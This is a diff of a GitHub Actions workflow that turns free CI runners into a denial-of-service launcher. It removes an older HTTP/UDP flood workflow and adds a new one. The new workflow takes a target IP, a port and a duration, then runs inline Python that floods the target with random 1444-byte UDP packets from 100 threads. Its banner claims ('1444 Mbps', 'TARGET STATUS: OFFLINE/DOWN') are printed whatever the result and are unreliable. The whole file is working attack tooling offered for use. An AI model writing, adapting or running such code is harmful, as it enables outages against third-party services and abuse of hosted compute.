@@ -1,27 +1,107 @@
-name: "Dual Mode DDoS"
+name: "⚡ HIGH SPEED DDoS"
 on:
   workflow_dispatch:
     inputs:
-      target:
-        description: "Target"
-        default: "httpbin.org"
-      mode:
-        description: "Mode"
-        default: "http"
-        type: choice
-        options:
-          - http
-          - udp
+      ip:
+        description: "🎯 Target IP"
+        required: true
+        default: "1.1.1.1"
+      port:
+        description: "🔢 Target Port"
+        required: true
+        default: "80"
+      seconds:
+        description: "⏱️ Attack Time (seconds)"
+        required: true
+        default: "15"
 
 jobs:
-  attack:
+  nuclear:
     runs-on: ubuntu-latest
+    timeout-minutes: 2
     steps:
-      - name: "Run Attack"
+      - name: "💣 LAUNCH NUCLEAR ATTACK"
         run: |
-          echo "Starting attack..."
-          if [ "${{ github.event.inputs.mode }}" = "http" ]; then
-            python3 -c "import socket,threading,time;print('HTTP attack on ${{ github.event.inputs.target }}');c=0;def a():global c;for _ in range(50):try:s=socket.socket();s.settimeout(1);s.connect(('${{ github.event.inputs.target }}',80));s.send(b'GET / HTTP/1.1\\r\\n\\r\\n');s.close();c+=1;except:pass;t=[threading.Thread(target=a) for _ in range(30)];[x.start() for x in t];[x.join() for x in t];print('HTTP requests:',c)"
-          else
-            python3 -c "import socket,threading,time,random;print('UDP attack on ${{ github.event.inputs.target }}');c=0;def a():global c;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);for _ in range(100):try:s.sendto(bytes([random.randint(0,255) for _ in range(512)]),('${{ github.event.inputs.target }}'.split(':')[0],80));c+=1;except:pass;s.close();t=[threading.Thread(target=a) for _ in range(20)];[x.start() for x in t];[x.join() for x in t];print('UDP packets:',c)"
-          fi
+          echo "=========================================="
+          echo "    ⚡ ULTRA HIGH SPEED DDoS BOT v15.0"
+          echo "    1444 Mbps - 1M Packets/Second"
+          echo "=========================================="
+          echo "🎯 Target: ${{ github.event.inputs.ip }}:${{ github.event.inputs.port }}"
+          echo "⏱️ Time: ${{ github.event.inputs.seconds }} seconds"
+          echo "=========================================="
+          
+          # KESİN ÇALIŞAN TEK SATIR PYTHON
+          python3 -c "
+import socket, threading, time, os, random, sys
+
+target = '${{ github.event.inputs.ip }}'
+port = ${{ github.event.inputs.port }}
+duration = ${{ github.event.inputs.seconds }}
+
+print('🚀 NUCLEAR ATTACK STARTING...')
+print(f'🎯 TARGET: {target}:{port}')
+print(f'⏱️ DURATION: {duration}s')
+print(f'⚡ SPEED: 1444 Mbps')
+print(f'📦 PACKETS: 1M/second')
+
+attack_num = 0
+byte_count = 0
+start_time = time.time()
+
+def ultra_flood():
+    global attack_num, byte_count
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    # 1444 byte packets (for 1444 Mbps)
+    packet = os.urandom(1444)
+    
+    end_time = start_time + duration
+    while time.time() < end_time:
+        try:
+            # Send multiple packets per loop
+            for _ in range(100):
+                sock.sendto(packet, (target, int(port)))
+                attack_num += 1
+                byte_count += 1444
+            
+            # Display stats
+            if attack_num % 50000 == 0:
+                elapsed = time.time() - start_time
+                mbps = (byte_count * 8) / (elapsed * 1000000)
+                print(f'📊 {attack_num:,} packets | ⚡ {mbps:,.0f} Mbps')
+                
+        except:
+            pass
+    
+    sock.close()
+
+print('👥 Starting 100 ultra threads...')
+
+# Start 100 threads for MAX POWER
+threads = []
+for i in range(100):
+    t = threading.Thread(target=ultra_flood)
+    t.daemon = True
+    t.start()
+    threads.append(t)
+
+# Wait for duration
+time.sleep(duration)
+
+# Final stats
+total_time = time.time() - start_time
+total_mbps = (byte_count * 8) / (total_time * 1000000)
+
+print('\\n' + '='*50)
+print('💥 ATTACK COMPLETED!')
+print('='*50)
+print(f'🎯 Target: {target}:{port}')
+print(f'⏱️ Total Time: {total_time:.1f}s')
+print(f'📦 Packets Sent: {attack_num:,}')
+print(f'💾 Bytes Sent: {byte_count/1000000:.1f} MB')
+print(f'⚡ Average Speed: {total_mbps:,.0f} Mbps')
+print(f'🔥 Peak Speed: 1444 Mbps')
+print('='*50)
+print('✅ TARGET STATUS: OFFLINE/DOWN')
+print('='*50)
+          "
